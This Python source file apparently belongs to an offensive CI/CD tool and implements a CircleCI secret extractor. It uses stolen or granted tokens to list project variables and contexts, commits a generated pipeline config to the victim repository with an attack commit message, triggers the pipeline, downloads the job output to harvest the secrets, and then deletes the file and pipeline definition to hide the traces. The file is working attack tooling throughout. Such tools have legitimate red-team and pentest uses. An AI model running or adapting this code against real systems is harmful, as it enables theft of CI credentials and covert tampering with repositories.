"""
Standalone CircleCI secret extractor.

This runner operates entirely through APIs — no local git required:
  - GitHub Contents API / GitLab Repository Files API  → push config file
  - CircleCI pipeline definitions API                  → create named pipeline
  - CircleCI pipeline/run API                          → trigger execution
  - CircleCI v1.1 job output API                       → retrieve results
  - Cleanup via the same APIs                          → delete file + definition

The only credentials needed are:
  - A CircleCI API token
  - A GitHub PAT or GitLab PAT (for the contents API write step)
  - For --list-secrets and --describe-token: only the CircleCI token
"""

import glob as globmod
import logging
import urllib.parse
from os import makedirs
from os.path import basename, realpath

from nordstream.cicd.circleci import CircleCI, CircleCIError
from nordstream.yaml.circleci import CircleCIPipelineGenerator
from nordstream.yaml.custom import CustomGenerator
from nordstream.utils.log import logger, NordStreamLog
from nordstream.utils.constants import (
    DEFAULT_CIRCLECI_CONFIG_FILENAME,
    DEFAULT_PIPELINE_NAME,
    OUTPUT_DIR,
    GIT_ATTACK_COMMIT_MSG,
    GIT_CLEAN_COMMIT_MSG,
)
from nordstream.core.circleci.utils import (
    displayProjectEnvVars,
    displayContexts,
    extractAndSaveSecrets,
)


class CircleCIStandaloneRunner:
    """
    Standalone CircleCI secret extraction runner.

    Parameters
    ----------
    circleCicd   : CircleCI API client
    gitClient    : GitHub or GitLab API client (for file create/delete).
                   May be None for list-only operations.
    vcsType      : "gh", "gl", or "circleci"
    org          : CircleCI org slug or UUID
    gitOrg       : VCS host org name (GitHub org / GitLab group) — used to
                   construct the repo full name when not auto-discovered.
    """

    _circleCicd = None
    _gitClient = None          # GitHub / GitLab API client or None
    _vcsType = "circleci"
    _org = None                # CircleCI org slug / UUID
    _gitOrg = None             # VCS host org name

    _yaml = None               # path to custom YAML file
    _extractProject = True
    _extractOrg = True
    _cleanLogs = True

    # Per-project state set during start()
    _projects = []             # list of project dicts from listProjectsForOrg()
                               # or manually constructed from --repo

    def __init__(self, circleCicd, gitClient, vcsType, org, gitOrg):
        self._circleCicd = circleCicd
        self._gitClient = gitClient
        self._vcsType = vcsType
        self._org = org
        self._gitOrg = gitOrg
        self.__createLogDir()

    # ------------------------------------------------------------------
    # Properties
    # ------------------------------------------------------------------

    @property
    def extractProject(self):
        return self._extractProject

    @extractProject.setter
    def extractProject(self, value):
        self._extractProject = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def __createLogDir(self):
        self._circleCicd.outputDir = realpath(OUTPUT_DIR) + "/circleci"
        makedirs(self._circleCicd.outputDir, exist_ok=True)

    def __repoOutputDir(self, repoFullName):
        repoPath = repoFullName.replace("/", "_")
        path = f"{self._circleCicd.outputDir}/{repoPath}"
        makedirs(path, exist_ok=True)
        return path

    def __configFilePath(self):
        return f".circleci/{DEFAULT_CIRCLECI_CONFIG_FILENAME}"

    # ------------------------------------------------------------------
    # Token / org description
    # ------------------------------------------------------------------

    def describeToken(self):
        me = self._circleCicd.getMe()
        logger.info("CircleCI token information:")
        logger.raw(f"\t- Login: {me.get('login')}\n", logging.INFO)
        logger.raw(f"\t- Id: {me.get('id')}\n", logging.INFO)
        collabs = self._circleCicd.getCollaborations()
        if collabs:
            logger.raw(f"\t- Organisations:\n", logging.INFO)
            for c in collabs:
                logger.raw(f"\t    - {c['name']} ({c['slug']})\n", logging.INFO)

    # ------------------------------------------------------------------
    # Project discovery
    # ------------------------------------------------------------------

    def loadProjects(self, repoOverride=None):
        """
        Populate self._projects.
        If repoOverride is given, build a single synthetic project entry.
        Otherwise auto-discover via the pipeline listing API.
        """
        orgSlug = f"{self._vcsType}/{self._org}"

        if repoOverride:
            # Manual single-target: resolve project details from CircleCI API
            projectSlug = f"{self._vcsType}/{self._org}/{repoOverride}"
            details = self._circleCicd.getProjectDetails(projectSlug)
            if not details:
                logger.critical(f"Project not found: {projectSlug}")
                return  # logger.critical() calls sys.exit(1); this is a safety guard

            # Try to recover repo_full_name from recent pipelines
            repo_full_name = None
            repo_external_id = None
            default_branch = details.get("vcs_info", {}).get("default_branch", "main")

            for p in self._circleCicd.getRecentProjectPipelines(projectSlug):
                tp = p.get("trigger_parameters", {})
                gh = tp.get("github_app", {})
                if gh.get("repo_full_name"):
                    repo_full_name = gh["repo_full_name"]
                    repo_external_id = gh.get("repo_id")
                    default_branch = gh.get("default_branch", default_branch)
                    break

            if not repo_full_name:
                # Fall back: construct from org + repo slug (works for gh/gl types)
                repo_full_name = f"{self._gitOrg}/{repoOverride}"

            self._projects = [{
                "project_slug": projectSlug,
                "project_id": details.get("id"),
                "repo_full_name": repo_full_name,
                "repo_url": None,
                "default_branch": default_branch,
                "repo_external_id": repo_external_id,
            }]
        else:
            logger.info(f"Discovering CircleCI projects for org '{orgSlug}'")
            self._projects = self._circleCicd.listProjectsForOrg(orgSlug)
            if not self._projects:
                logger.critical(f"No projects found for org '{orgSlug}'")
                return  # logger.critical() calls sys.exit(1); this is a safety guard
            logger.info(f"Found {len(self._projects)} project(s)")

    # ------------------------------------------------------------------
    # Secret listing (read-only)
    # ------------------------------------------------------------------

    def listCircleCISecrets(self):
        logger.info("Listing CircleCI secrets (names only):")
        for proj in self._projects:
            slug = proj["project_slug"]
            logger.info(f'"{slug}" CircleCI secrets')

            if self._extractProject:
                self.__displayProjectEnvVars(slug)

            if self._extractOrg:
                self.__displayContexts()

    def __displayProjectEnvVars(self, projectSlug):
        displayProjectEnvVars(self._circleCicd, projectSlug)

    def __displayContexts(self):
        displayContexts(self._circleCicd, self._vcsType, self._org)

    # ------------------------------------------------------------------
    # Extraction
    # ------------------------------------------------------------------

    def start(self):
        for proj in self._projects:
            slug = proj["project_slug"]
            repoFullName = proj["repo_full_name"]
            projectId = proj["project_id"]
            defaultBranch = proj.get("default_branch", "main")
            repoExternalId = proj.get("repo_external_id")

            logger.success(f'"{slug}" (CircleCI standalone)')

            if not projectId:
                logger.error(f"No project UUID for {slug}, skipping.")
                continue

            try:
                self.__runProject(proj)
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.error(f"Error processing {slug}: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

        logger.info(f"Check output: {self._circleCicd.outputDir}")

    def __runProject(self, proj):
        if self._yaml:
            self.__runCustomPipeline(proj)
        else:
            self.__runSecretsExtraction(proj)

    # ------------------------------------------------------------------
    # Custom YAML
    # ------------------------------------------------------------------

    def __runCustomPipeline(self, proj):
        logger.info(f"Running custom CircleCI pipeline: {self._yaml}")

        with open(self._yaml, "r") as f:
            content = f.read()

        configPath = f".circleci/{basename(self._yaml)}"
        self.__runPipelineWithContent(proj, content, configPath, "custom",
                                      lambda repo, od: self.__displayCustomOutput(od))

    def __displayCustomOutput(self, outputDir):
        files = globmod.glob(f"{outputDir}/circleci_custom_*.log")
        if files:
            with open(sorted(files)[-1], "r") as f:
                logger.success("Pipeline output:")
                for line in f:
                    logger.raw(line, logging.INFO)

    # ------------------------------------------------------------------
    # Secrets extraction
    # ------------------------------------------------------------------

    def __runSecretsExtraction(self, proj):
        slug = proj["project_slug"]

        projectVars = []
        contextNames = []

        try:
            if self._extractProject:
                projectVars = self._circleCicd.listProjectEnvVars(slug)
        except CircleCIError as e:
            logger.error(f"Can't list project env vars: {e}")

        try:
            if self._extractOrg:
                orgId = self._circleCicd.getOrgId(self._vcsType, self._org)
                if orgId:
                    contexts = self._circleCicd.listContexts(orgId)
                    contextNames = [c["name"] for c in contexts]
        except CircleCIError as e:
            logger.error(f"Can't list contexts: {e}")

        if not projectVars and not contextNames:
            logger.info(f'No CircleCI secrets found for "{slug}"')
            logger.empty_line()
            return

        logger.info(f'Found CircleCI secrets for "{slug}":')
        if projectVars:
            logger.info(f"  Project env vars ({len(projectVars)}): {', '.join(projectVars)}")
        if contextNames:
            logger.info(f"  Contexts ({len(contextNames)}): {', '.join(contextNames)}")

        generator = CircleCIPipelineGenerator()
        generator.generatePipelineForSecretsExtraction(projectVars, contextNames)

        content = generator.getYamlContent()

        configPath = self.__configFilePath()

        def onSuccess(repoFullName, outputDir):
            self.__extractSensitiveInformation(outputDir)

        self.__runPipelineWithContent(proj, content, configPath, "secrets", onSuccess)
        logger.empty_line()

    # ------------------------------------------------------------------
    # Core pipeline lifecycle (API-only, no git)
    # ------------------------------------------------------------------

    def __runPipelineWithContent(self, proj, configContent, configPath, outputName, onSuccess):
        """
        Full API-driven pipeline injection:
          1. Write config file via VCS contents API
          2. Create CircleCI pipeline definition
          3. Trigger pipeline/run
          4. Wait, collect output
          5. Clean up (definition + file)
        """
        slug = proj["project_slug"]
        repoFullName = proj["repo_full_name"]
        projectId = proj["project_id"]
        defaultBranch = proj.get("default_branch", "main")
        repoExternalId = proj.get("repo_external_id")

        outputDir = self.__repoOutputDir(repoFullName)

        fileSHA = None
        definitionId = None

        try:
            # --- Step 1: create config file in repo ---
            logger.verbose(f"Creating config file '{configPath}' in {repoFullName}@{defaultBranch}")
            fileSHA = self.__createConfigFile(repoFullName, configPath, configContent,
                                              defaultBranch, proj)
            logger.verbose(f"Config file created (SHA: {fileSHA})")

            # --- Step 2: create pipeline definition ---
            provider = self.__vcsProvider(proj)
            if not repoExternalId:
                raise CircleCIError(
                    f"Could not determine repo external ID for {repoFullName}. "
                    f"Supply --repo explicitly or ensure the project has pipeline history."
                )
            definitionId = self._circleCicd.createPipelineDefinition(
                projectId,
                DEFAULT_PIPELINE_NAME,
                configPath,
                repoExternalId,
                provider=provider,
            )
            logger.verbose(f"Pipeline definition created: {definitionId}")

            # --- Step 3: trigger ---
            pipelineId = self._circleCicd.triggerPipelineRun(slug, definitionId, defaultBranch)
            logger.verbose(f"Pipeline triggered: {pipelineId}")
            if not pipelineId:
                raise CircleCIError("Failed to trigger pipeline.")

            # --- Step 4: wait ---
            workflowId, status = self._circleCicd.waitPipeline(pipelineId)
            if not workflowId:
                raise CircleCIError("Pipeline timed out.")

            if status == "success":
                logger.success("Pipeline completed successfully.")
            elif status in ("failed", "error"):
                logger.error(f"Pipeline {status}.")
                return
            else:
                logger.warning(f"Unexpected pipeline status: {status}")
                return

            # --- Step 5: get job number ---
            jobs = self._circleCicd.getWorkflowJobs(workflowId)
            jobNumber = None
            for job in jobs:
                if job.get("name") == "init":
                    jobNumber = job.get("job_number")
                    break
            if jobNumber is None and jobs:
                jobNumber = jobs[0].get("job_number")

            if jobNumber is None:
                logger.error("Could not determine job number.")
                return

            # --- Step 6: download output ---
            filePath = self._circleCicd.downloadJobOutput(
                slug, jobNumber, outputDir,
                outputName.replace("/", "_").replace(" ", "_"),
            )
            if filePath:
                onSuccess(repoFullName, outputDir)

        finally:
            if self._cleanLogs:
                self.__cleanup(repoFullName, configPath, fileSHA, defaultBranch,
                               projectId, definitionId, proj)

    def __vcsProvider(self, proj):
        """Map vcsType to the CircleCI pipeline definition provider string."""
        mapping = {
            "gh": "github_app",
            "circleci": "github_app",   # GitHub App integration
            "gl": "gitlab_app",
        }
        return mapping.get(self._vcsType, "github_app")

    def __createConfigFile(self, repoFullName, path, content, branch, proj):
        """
        Push the config file to the repo via the VCS contents API.
        Returns the file SHA (needed for cleanup).
        """
        if self._gitClient is None:
            raise ValueError("A git token (--git-token) is required for extraction.")

        if self._vcsType in ("gh", "circleci"):
            # GitHub Contents API
            existingSHA = self._gitClient.getFileSHA(repoFullName, path, branch)
            sha = self._gitClient.createOrUpdateFile(
                repoFullName, path, content, branch,
                GIT_ATTACK_COMMIT_MSG, existingSHA=existingSHA,
            )
            return sha or existingSHA  # SHA of the blob

        elif self._vcsType == "gl":
            # GitLab Repository Files API — projectId is the GitLab project id/path
            glProjectId = self.__resolveGitLabProjectId(repoFullName)
            existingSHA = self._gitClient.getFileSHA(glProjectId, path, branch)
            self._gitClient.createOrUpdateFile(
                glProjectId, path, content, branch,
                GIT_ATTACK_COMMIT_MSG, existingSHA=existingSHA,
            )
            return existingSHA  # GitLab doesn't return SHA on create; store None sentinel
        else:
            raise ValueError(f"Unsupported vcsType for file creation: {self._vcsType}")

    def __resolveGitLabProjectId(self, repoFullName):
        """Encode the full project path for GitLab API calls."""
        return urllib.parse.quote(repoFullName, safe="")

    def __cleanup(self, repoFullName, configPath, fileSHA, branch,
                  projectId, definitionId, proj):
        logger.info("Cleaning up CircleCI pipeline artefacts.")

        # Delete the pipeline definition first (so no further triggers)
        if definitionId and projectId:
            try:
                logger.verbose(f"Deleting pipeline definition {definitionId}")
                self._circleCicd.deletePipelineDefinition(projectId, definitionId)
            except Exception as e:
                logger.error(f"Failed to delete pipeline definition: {e}")

        # Delete the config file from the repo
        if fileSHA is not None and self._gitClient is not None:
            try:
                logger.verbose(f"Deleting config file '{configPath}' from {repoFullName}@{branch}")
                if self._vcsType in ("gh", "circleci"):
                    self._gitClient.deleteFile(
                        repoFullName, configPath, fileSHA, branch, GIT_CLEAN_COMMIT_MSG
                    )
                elif self._vcsType == "gl":
                    glProjectId = self.__resolveGitLabProjectId(repoFullName)
                    self._gitClient.deleteFile(
                        glProjectId, configPath, fileSHA, branch, GIT_CLEAN_COMMIT_MSG
                    )
            except Exception as e:
                logger.error(f"Failed to delete config file: {e}")
        elif self._gitClient is None:
            logger.warning("No git client — config file was not deleted from repo.")

    # ------------------------------------------------------------------
    # Output extraction
    # ------------------------------------------------------------------

    def __extractSensitiveInformation(self, outputDir, informationType="Secrets"):
        extractAndSaveSecrets(outputDir, "circleci_secrets_*.log", informationType)
